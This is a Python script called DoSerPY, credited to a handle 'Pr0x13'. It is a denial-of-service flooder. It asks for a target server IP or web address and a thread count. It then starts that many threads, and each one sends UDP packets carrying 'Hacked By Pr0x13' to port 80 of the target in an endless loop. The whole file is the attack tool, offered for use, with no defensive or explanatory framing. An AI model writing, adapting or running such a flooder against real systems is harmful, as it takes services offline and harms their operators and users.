import time
import socket
import sys
import _thread
import os
os.system('cls' or 'clear')
class color :
   GREEN = '\033[92m'
   RED = '\033[91m'
   WHITE = '\033[0m'
   BLUE = '\033[34m'
   CYAN = '\033[96m'
   PURPLE = '\033[35m'
print(color.RED + "Welcome To DoSerPY" + color.WHITE)
time.sleep(1)
banner = """██████╗  █████╗ ██████╗ ███████╗ █████╗ 
██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
██████╔╝███████║██████╔╝███████╗███████║
██╔═══╝ ██╔══██║██╔══██╗╚════██║██╔══██║
██║     ██║  ██║██║  ██║███████║██║  ██║
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝"""
print(color.PURPLE + banner + color.WHITE)

print(color.CYAN + " Instagram : Parsa36704" + color.WHITE)
print(color.CYAN + " GiTHuB : Pr0x13 " + color.WHITE)
print(color.CYAN + " PSN iD : Parsa36704 " + color.WHITE)
print(color.CYAN + " Programmed by Pr0x13 " + color.WHITE)
time.sleep(2)


site = input(color.RED + "Enter your server iP OR Web URL => " + color.WHITE)
thread_count = input(color.RED + "Enter your thread => " + color.WHITE)

ip = socket.gethostbyname(site)

UDP_PORT = 80
MESSAGE = "Hacked By Pr0x13"
print(color.GREEN + "UDP target IP:", ip + color.WHITE)
print("UDP target port:", UDP_PORT)
time.sleep(3)

def ddos(i):
    while 1:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
        print(color.PURPLE + "Pr0x13#!",color.RED +  "--.:Sending UDP Packets To Targ3t...:" + color.WHITE)

for i in range(int(thread_count)):
    try:
        _thread.start_new_thread(ddos, ("Thread-" + str(i),))
    except KeyboardInterrupt:
        sys.exit(0)

while 1:
    pass
